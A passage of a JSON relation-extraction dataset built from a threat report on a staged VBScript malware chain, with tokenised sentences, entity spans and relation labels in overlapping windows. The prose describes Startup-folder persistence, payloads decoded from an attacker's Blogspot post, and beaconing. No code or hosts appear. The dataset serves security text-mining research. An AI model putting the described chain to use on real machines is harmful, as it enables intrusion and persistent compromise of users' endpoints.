"shortcut", "to", "it", "in", "the", "current", "user", "'s", "Startup", "directory", ",", "a", "detail", "to", "remember", "later", "."], ["Stage", "2", "installs", "Stage", "3", "VBS", "on", "the", "endpoint", "."], ["The", "Stage", "3", "VBS", "file", "is", "responsible", "for", "retrieving", "harmful", "content", "from", "an", "attacker-designed", "Blogspot", "blog", "."], ["The", "blog", "has", "a", "VBScript", "encoded", "in", "base64", ",", "which", "Stage", "3", "decodes", "and", "launches", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "VBA code", "pos": [7, 9], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "VBScript", "pos": [15, 16], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "% Appdata % \\desktop.ini", "pos": [0, 4], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [31, 31], "name": "VBS", "pos": [3, 4], "index": "3_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [44, 44], "name": "wscript.exe", "pos": [16, 17], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [49, 49], "name": "Macros", "pos": [0, 1], "index": "5_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [57, 57], "name": "wscript.exe", "pos": [8, 9], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [62, 62], "name": "VBS", "pos": [3, 4], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [73, 73], "name": "shortcut", "pos": [14, 15], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [90, 90], "name": "Stage 2", "pos": [0, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [95, 95], "name": "VBS", "pos": [5, 6], "index": "10_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [98, 98], "name": "endpoint", "pos": [8, 9], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [103, 103], "name": "VBS", "pos": [3, 4], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [110, 110], "name": "content", "pos": [10, 11], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [114, 114], "name": "Blogspot blog", "pos": [14, 16], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [118, 118], "name": "blog", "pos": [1, 2], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [121, 121], "name": "VBScript", "pos": [4, 5], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [127, 127], "name": "Stage 3", "pos": [10, 12], "index": "17_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RD", "evidence": [2], "t": 3, "h": 4}, {"r": "EX", "evidence": [2], "t": 3, "h": 4}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "FR", "evidence": [3], "t": 5, "h": 6}, {"r": "EX", "evidence": [3, 4], "h": 5, "t": 8}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "WR", "evidence": [5], "h": 9, "t": 10}, {"r": "ST", "evidence": [5], "h": 9, "t": 11}, {"r": "RF", "evidence": [5], "h": 9, "t": 11}, {"r": "WR", "evidence": [6], "h": 12, "t": 13}, {"r": "CO", "evidence": [6, 7], "h": 14, "t": 15}, {"r": "EX", "evidence": [7], "t": 16, "h": 17}]}, {"title": "14_g02-6", "sents": [["%", "Appdata", "%", "\\desktop.ini"], ["The", "Stage", "2", "VBS", "installs", "another", "base64-decoded", "VBScript", "(", "Stage", "3", ")", "and", "launches", "it", "using", "wscript.exe", "and", "similar", "commands", ":"], ["Macros", "save", "VBS", "on", "disk", "and", "run", "via", "wscript.exe", "."], ["The", "Stage", "2", "VBS", "also", "sets", "up", "Stage", "3", "'s", "persistence", "by", "creating", "a", "shortcut", "to", "it", "in", "the", "current", "user", "'s", "Startup", "directory", ",", "a", "detail", "to", "remember", "later", "."], ["Stage", "2", "installs", "Stage", "3", "VBS", "on", "the", "endpoint", "."], ["The", "Stage", "3", "VBS", "file", "is", "responsible", "for", "retrieving", "harmful", "content", "from", "an", "attacker-designed", "Blogspot", "blog", "."], ["The", "blog", "has", "a", "VBScript", "encoded", "in", "base64", ",", "which", "Stage", "3", "decodes", "and", "launches", "."], ["Furthermore", ",", "Stage", "3", "scans", "the", "blogpost", "for", "special", "tags", "that", "identify", "its", "body", ",", "decodes", "the", "content", ",", "and", "executes", "it", "on", "the", "endpoint", ":"]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [0, 0], "name": "% Appdata % \\desktop.ini", "pos": [0, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [7, 7], "name": "VBS", "pos": [3, 4], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [20, 20], "name": "wscript.exe", "pos": [16, 17], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [25, 25], "name": "Macros", "pos": [0, 1], "index": "3_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [33, 33], "name": "wscript.exe", "pos": [8, 9], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [38, 38], "name": "VBS", "pos": [3, 4], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [49, 49], "name": "shortcut", "pos": [14, 15], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [66, 66], "name": "Stage 2", "pos": [0, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [71, 71], "name": "VBS", "pos": [5, 6], "index": "8_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [74, 74], "name": "endpoint", "pos": [8, 9], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [79, 79], "name": "VBS", "pos": [3, 4], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [86, 86], "name": "content", "pos": [10, 11], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [90, 90], "name": "Blogspot blog", "pos": [14, 16], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [94, 94], "name": "blog", "pos": [1, 2], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [97, 97], "name": "VBScript", "pos": [4, 5], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [103, 103], "name": "Stage 3", "pos": [10, 12], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [111, 111], "name": "Stage 3", "pos": [2, 4], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [126, 126], "name": "content", "pos": [17, 18], "index": "17_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [133, 133], "name": "endpoint", "pos": [24, 25], "index": "18_0"}]], "labels": [{"r": "RD", "evidence": [1], "t": 1, "h": 2}, {"r": "EX", "evidence": [1], "t": 1, "h": 2}, {"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "FR", "evidence": [2], "t": 3, "h": 4}, {"r": "EX", "evidence": [2, 3], "h": 3, "t": 6}, {"r": "WR", "evidence": [3], "h": 5, "t": 6}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "ST", "evidence": [4], "h": 7, "t": 9}, {"r": "RF", "evidence": [4], "h": 7, "t": 9}, {"r": "WR", "evidence": [5], "h": 10, "t": 11}, {"r": "CO", "evidence": [5, 6], "h": 12, "t": 13}, {"r": "EX", "evidence": [6], "t": 14, "h": 15}, {"r": "ST", "evidence": [6, 7], "h": 15, "t": 18}, {"r": "RF", "evidence": [6, 7], "h": 15, "t": 18}, {"r": "CO", "evidence": [6, 7], "h": 15, "t": 16}, {"r": "WR", "evidence": [7], "h": 16, "t": 17}]}, {"title": "14_g02-7", "sents": [["The", "Stage", "2", "VBS", "installs", "another", "base64-decoded", "VBScript", "(", "Stage", "3", ")", "and", "launches", "it", "using", "wscript.exe", "and", "similar", "commands", ":"], ["Macros", "save", "VBS", "on", "disk", "and", "run", "via", "wscript.exe", "."], ["The", "Stage", "2", "VBS", "also", "sets", "up", "Stage", "3", "'s", "persistence", "by", "creating", "a", "shortcut", "to", "it", "in", "the", "current", "user", "'s", "Startup", "directory", ",", "a", "detail", "to", "remember", "later", "."], ["Stage", "2", "installs", "Stage", "3", "VBS", "on", "the", "endpoint", "."], ["The", "Stage", "3", "VBS", "file", "is", "responsible", "for", "retrieving", "harmful", "content", "from", "an", "attacker-designed", "Blogspot", "blog", "."], ["The", "blog", "has", "a", "VBScript", "encoded", "in", "base64", ",", "which", "Stage", "3", "decodes", "and", "launches", "."], ["Furthermore", ",", "Stage", "3", "scans", "the", "blogpost", "for", "special", "tags", "that", "identify", "its", "body", ",", "decodes", "the", "content", ",", "and", "executes", "it", "on", "the", "endpoint", ":"], ["Stage", "3", "extracts", "and", "analyzes", "the", "blogpost", "'s", "content", "to", "identify", "the", "next", "VBScript", "to", "execute", "on", "the", "endpoint", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "VBS", "pos": [3, 4], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [16, 16], "name": "wscript.exe", "pos": [16, 17], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "Macros", "pos": [0, 1], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [29, 29], "name": "wscript.exe", "pos": [8, 9], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [34, 34], "name": "VBS", "pos": [3, 4], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [45, 45], "name": "shortcut", "pos": [14, 15], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [62, 62], "name": "Stage 2", "pos": [0, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [67, 67], "name": "VBS", "pos": [5, 6], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [70, 70], "name": "endpoint", "pos": [8, 9], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [75, 75], "name": "VBS", "pos": [3, 4], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [82, 82], "name": "content", "pos": [10, 11], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [86, 86], "name": "Blogspot blog", "pos": [14, 16], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [90, 90], "name": "blog", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [93, 93], "name": "VBScript", "pos": [4, 5], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [99, 99], "name": "Stage 3", "pos": [10, 12], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [107, 107], "name": "Stage 3", "pos": [2, 4], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [122, 122], "name": "content", "pos": [17, 18], "index": "16_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [129, 129], "name": "endpoint", "pos": [24, 25], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [131, 131], "name": "Stage 3", "pos": [0, 2], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [137, 137], "name": "blogpost 's content", "pos": [6, 9], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [144, 144], "name": "VBScript", "pos": [13, 14], "index": "20_0"}]], "labels": [{"r": "RD", "evidence": [0], "t": 0, "h": 1}, {"r": "EX", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [1], "t": 2, "h": 3}, {"r": "EX", "evidence": [1, 2], "h": 2, "t": 5}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "ST", "evidence": [3], "h": 6, "t": 8}, {"r": "RF", "evidence": [3], "h": 6, "t": 8}, {"r": "WR", "evidence": [4], "h": 9, "t": 10}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 12}, {"r": "EX", "evidence": [5], "t": 13, "h": 14}, {"r": "ST", "evidence": [5, 6], "h": 14, "t": 17}, {"r": "RF", "evidence": [5, 6], "h": 14, "t": 17}, {"r": "CO", "evidence": [5, 6], "h": 14, "t": 15}, {"r": "CO", "evidence": [5, 6, 7], "h": 14, "t": 18}, {"r": "WR", "evidence": [6], "h": 15, "t": 16}, {"r": "WR", "evidence": [7], "h": 18, "t": 19}, {"r": "EX", "evidence": [7], "h": 18, "t": 20}]}, {"title": "14_g02-8", "sents": [["Macros", "save", "VBS", "on", "disk", "and", "run", "via", "wscript.exe", "."], ["The", "Stage", "2", "VBS", "also", "sets", "up", "Stage", "3", "'s", "persistence", "by", "creating", "a", "shortcut", "to", "it", "in", "the", "current", "user", "'s", "Startup", "directory", ",", "a", "detail", "to", "remember", "later", "."], ["Stage", "2", "installs", "Stage", "3", "VBS", "on", "the", "endpoint", "."], ["The", "Stage", "3", "VBS", "file", "is", "responsible", "for", "retrieving", "harmful", "content", "from", "an", "attacker-designed", "Blogspot", "blog", "."], ["The", "blog", "has", "a", "VBScript", "encoded", "in", "base64", ",", "which", "Stage", "3", "decodes", "and", "launches", "."], ["Furthermore", ",", "Stage", "3", "scans", "the", "blogpost", "for", "special", "tags", "that", "identify", "its", "body", ",", "decodes", "the", "content", ",", "and", "executes", "it", "on", "the", "endpoint", ":"], ["Stage", "3", "extracts", "and", "analyzes", "the", "blogpost", "'s", "content", "to", "identify", "the", "next", "VBScript", "to", "execute", "on", "the", "endpoint", "."], ["Malicious", "Blogspot", "content", "-", "Post-compromise", "activities"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Macros", "pos": [0, 1], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [8, 8], "name": "wscript.exe", "pos": [8, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [13, 13], "name": "VBS", "pos": [3, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "shortcut", "pos": [14, 15], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [41, 41], "name": "Stage 2", "pos": [0, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [46, 46], "name": "VBS", "pos": [5, 6], "index": "5_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [49, 49], "name": "endpoint", "pos": [8, 9], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [54, 54], "name": "VBS", "pos": [3, 4], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [61, 61], "name": "content", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [65, 65], "name": "Blogspot blog", "pos": [14, 16], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [69, 69], "name": "blog", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [72, 72], "name": "VBScript", "pos": [4, 5], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [78, 78], "name": "Stage 3", "pos": [10, 12], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [86, 86], "name": "Stage 3", "pos": [2, 4], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [101, 101], "name": "content", "pos": [17, 18], "index": "14_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [108, 108], "name": "endpoint", "pos": [24, 25], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [110, 110], "name": "Stage 3", "pos": [0, 2], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [116, 116], "name": "blogpost 's content", "pos": [6, 9], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [123, 123], "name": "VBScript", "pos": [13, 14], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [131, 131], "name": "Blogspot content", "pos": [1, 3], "index": "19_0"}]], "labels": [{"r": "FR", "evidence": [0], "t": 0, "h": 1}, {"r": "EX", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "ST", "evidence": [2], "h": 4, "t": 6}, {"r": "RF", "evidence": [2], "h": 4, "t": 6}, {"r": "WR", "evidence": [3], "h": 7, "t": 8}, {"r": "CO", "evidence": [3, 4], "h": 9, "t": 10}, {"r": "EX", "evidence": [4], "t": 11, "h": 12}, {"r": "ST", "evidence": [4, 5], "h": 12, "t": 15}, {"r": "RF", "evidence": [4, 5], "h": 12, "t": 15}, {"r": "CO", "evidence": [4, 5], "h": 12, "t": 13}, {"r": "CO", "evidence": [4, 5, 6], "h": 12, "t": 16}, {"r": "WR", "evidence": [5], "h": 13, "t": 14}, {"r": "WR", "evidence": [6], "h": 16, "t": 17}, {"r": "EX", "evidence": [6], "h": 16, "t": 18}, {"r": "CO", "evidence": [5, 6, 7], "t": 14, "h": 19}]}, {"title": "14_g02-9", "sents": [["The", "Stage", "2", "VBS", "also", "sets", "up", "Stage", "3", "'s", "persistence", "by", "creating", "a", "shortcut", "to", "it", "in", "the", "current", "user", "'s", "Startup", "directory", ",", "a", "detail", "to", "remember", "later", "."], ["Stage", "2", "installs", "Stage", "3", "VBS", "on", "the", "endpoint", "."], ["The", "Stage", "3", "VBS", "file", "is", "responsible", "for", "retrieving", "harmful", "content", "from", "an", "attacker-designed", "Blogspot", "blog", "."], ["The", "blog", "has", "a", "VBScript", "encoded", "in", "base64", ",", "which", "Stage", "3", "decodes", "and", "launches", "."], ["Furthermore", ",", "Stage", "3", "scans", "the", "blogpost", "for", "special", "tags", "that", "identify", "its", "body", ",", "decodes", "the", "content", ",", "and", "executes", "it", "on", "the", "endpoint", ":"], ["Stage", "3", "extracts", "and", "analyzes", "the", "blogpost", "'s", "content", "to", "identify", "the", "next", "VBScript", "to", "execute", "on", "the", "endpoint", "."], ["Malicious", "Blogspot", "content", "-", "Post-compromise", "activities"], ["Scripts", "for", "an", "initial", "beacon", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "VBS", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [14, 14], "name": "shortcut", "pos": [14, 15], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "Stage 2", "pos": [0, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [36, 36], "name": "VBS", "pos": [5, 6], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [39, 39], "name": "endpoint", "pos": [8, 9], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [44, 44], "name": "VBS", "pos": [3, 4], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [51, 51], "name": "content", "pos": [10, 11], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "Blogspot blog", "pos": [14, 16], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [59, 59], "name": "blog", "pos": [1, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [62, 62], "name": "VBScript", "pos": [4, 5], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [68, 68], "name": "Stage 3", "pos": [10, 12], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [76, 76], "name": "Stage 3", "pos": [2, 4], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [91, 91], "name": "content", "pos": [17, 18], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [98, 98], "name": "endpoint", "pos": [24, 25], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [100, 100], "name": "Stage 3", "pos": [0, 2], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [106, 106], "name": "blogpost 's content", "pos": [6, 9], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [113, 113], "name": "VBScript", "pos": [13, 14], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [121, 121], "name": "Blogspot content", "pos": [1, 3], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [129, 129], "name": "initial beacon", "pos": [3, 5], "index": "18_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "ST", "evidence": [1], "h": 2, "t": 4}, {"r": "RF", "evidence": [1], "h": 2, "t": 4}, {"r": "WR", "evidence": [2], "h": 5, "t": 6}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "EX", "evidence": [3], "t": 9, "h": 10}, {"r": "ST", "evidence": [3, 4], "h": 10, "t": 13}, {"r": "RF", "evidence": [3, 4], "h": 10, "t": 13}, {"r": "WR", "evidence": [3, 4, 5, 6, 7], "h": 10, "t": 18}, {"r": "CO", "evidence": [3, 4], "h": 10, "t": 11}, {"r": "CO", "evidence": [3, 4, 5], "h": 10, "t": 14}, {"r": "WR", "evidence": [4], "h": 11, "t": 12}, {"r": "WR", "evidence": [5], "h": 14, "t": 15}, {"r": "EX", "evidence": [5], "h": 14, "t": 16}, {"r": "CO", "evidence": [4, 5, 6], "t": 12, "h": 17}]}, {"title": "14_g02-10", "sents": [["Stage", "2", "installs", "Stage", "3", "VBS", "on", "the", "endpoint", "."], ["The", "Stage", "3", "VBS", "file", "is", "responsible", "for", "retrieving", "harmful", "content", "from", "an", "attacker-designed", "Blogspot", "blog", "."], ["The", "blog", "has", "a", "VBScript", "encoded", "in", "base64", ",", "which", "Stage", "3", "decodes", "and", "launches", "."], ["Furthermore", ",", "Stage", "3", "scans", "the", "blogpost", "for", "special", "tags", "that", "identify", "its", "body", ",", "decodes", "the", "content", ",", "and", "executes", "it", "on", "the", "endpoint", ":"], ["Stage", "3", "extracts", "and", "analyzes", "the", "blogpost", "'s", "content", "to", "identify", "the", "next", "VBScript", "to", "execute", "on", "the", "endpoint", "."], ["Malicious", "Blogspot", "content", "-", "Post-compromise", "activities"], ["Scripts", "for", "an", "initial", "beacon", "."], ["Modules", "for", "implanting", "instrumentors", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Stage 2", "pos": [0, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "VBS", "pos": [5, 6], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [8, 8], "name": "endpoint", "pos": [8, 9], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [13, 13], "name": "VBS", "pos": [3, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [20, 20], "name": "content", "pos": [10, 11], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "Blogspot blog", "pos": [14, 16], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [28, 28], "name": "blog", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [31, 31], "name": "VBScript", "pos": [4, 5], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [37, 37], "name": "Stage 3", "pos": [10, 12], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [45, 45], "name": "Stage 3", "pos": [2, 4], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [60, 60], "name": "content", "pos": [17, 18], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [67, 67], "name": "endpoint", "pos": [24, 25], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [69, 69], "name": "Stage 3", "pos": [0, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [75, 75], "name": "blogpost 's content", "pos": [6, 9], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [82, 82], "name": "VBScript", "pos": [13, 14], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [90, 90], "name": "Blogspot content", "pos": [1, 3], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [98, 98], "name": "initial beacon", "pos": [3, 5], "index": "16_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "EX", "evidence": [2], "t": 7, "h": 8}, {"r": "ST", "evidence": [2, 3], "h": 8, "t": 11}, {"r": "RF", "evidence": [2, 3], "h": 8, "t": 11}, {"r": "WR", "evidence": [2, 3, 4, 5, 6], "h": 8, "t": 16}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 9}, {"r": "CO", "evidence": [2, 3, 4], "h": 8, "t": 12}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [4], "h": 12, "t": 13}, {"r": "EX", "evidence": [4], "h": 12, "t": 14}, {"r": "CO", "evidence": [3, 4, 5], "t": 10, "h": 15}]}, {"title": "14_g02-11", "sents": [["The", "Stage", "3", "VBS", "file", "is", "responsible", "for", "retrieving", "harmful", "content", "from", "an", "attacker-designed", "Blogspot", "blog", "."], ["The", "blog", "has", "a", "VBScript", "encoded", "in", "base64", ",", "which", "Stage", "3", "decodes", "and", "launches", "."], ["Furthermore", ",", "Stage", "3", "scans", "the", "blogpost", "for", "special", "tags", "that", "identify", "its", "body", ",", "decodes", "the", "content", ",", "and", "executes", "it", "on", "the", "endpoint", ":"], ["Stage", "3", "extracts", "and", "analyzes", "the", "blogpost", "'s", "content", "to", "identify", "the", "next", "VBScript", "to", "execute", "on", "the", "endpoint", "."], ["Malicious", "Blogspot", "content", "-", "Post-compromise", "activities"], ["Scripts", "for", "an", "initial", "beacon", "."], ["Modules", "for", "implanting", "instrumentors", "."], ["Usually", ",", "the", "blog", "'s", "post", "body", "contains", "VBS", "code", "that", "sends", "a", "signal", "to", "an", "attacker-controlled", "remote", "location", ",", "signifying", "the", "successful", "victim", "compromise", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "VBS", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "content", "pos": [10, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [14, 14], "name": "Blogspot blog", "pos": [14, 16], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [18, 18], "name": "blog", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [21, 21], "name": "VBScript", "pos": [4, 5], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [27, 27], "name": "Stage 3", "pos": [10, 12], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [35, 35], "name": "Stage 3", "pos": [2, 4], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "content", "pos": [17, 18], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [57, 57], "name": "endpoint", "pos": [24, 25], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [59, 59], "name": "Stage 3", "pos": [0, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [65, 65], "name": "blogpost 's content", "pos": [6, 9], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [72, 72], "name": "VBScript", "pos": [13, 14], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [80, 80], "name": "Blogspot content", "pos": [1, 3], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [88, 88], "name": "initial beacon", "pos": [3, 5], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [104, 104], "name": "VBS code", "pos": [8, 10], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [109, 109], "name": "signal", "pos": [13, 14], "index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [112, 112], "name": "attacker-controlled remote location", "pos": [16, 19], "index": "16_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "EX", "evidence": [1], "t": 4, "h": 5}, {"r": "ST", "evidence": [1, 2], "h": 5, "t": 8}, {"r": "RF", "evidence": [1, 2], "h": 5, "t": 8}, {"r": "WR", "evidence": [1, 2, 3, 4, 5], "h": 5, "t": 13}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 5, "t": 9}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "EX", "evidence": [3], "h": 9, "t": 11}, {"r": "CO", "evidence": [2, 3, 4], "t": 7, "h": 12}, {"r": "WR", "evidence": [7], "h": 14, "t": 15}, {"r": "ST", "evidence": [7], "h": 14, "t": 16}, {"r": "RF", "evidence": [7], "h": 14, "t": 16}]}, {"title": "14_g02-12", "sents": [["The", "blog", "has", "a", "VBScript", "encoded", "in", "base64", ",", "which", "Stage", "3", "decodes", "and", "launches", "."], ["Furthermore", ",", "Stage", "3", "scans", "the", "blogpost", "for", "special", "tags", "that", "identify", "its", "body", ",", "decodes", "the", "content", ",", "and", "executes", "it", "on", "the", "endpoint", ":"], ["Stage", "3", "extracts", "and", "analyzes", "the", "blogpost", "'s", "content", "to", "identify", "the", "next", "VBScript", "to", "execute", "on", "the", "endpoint", 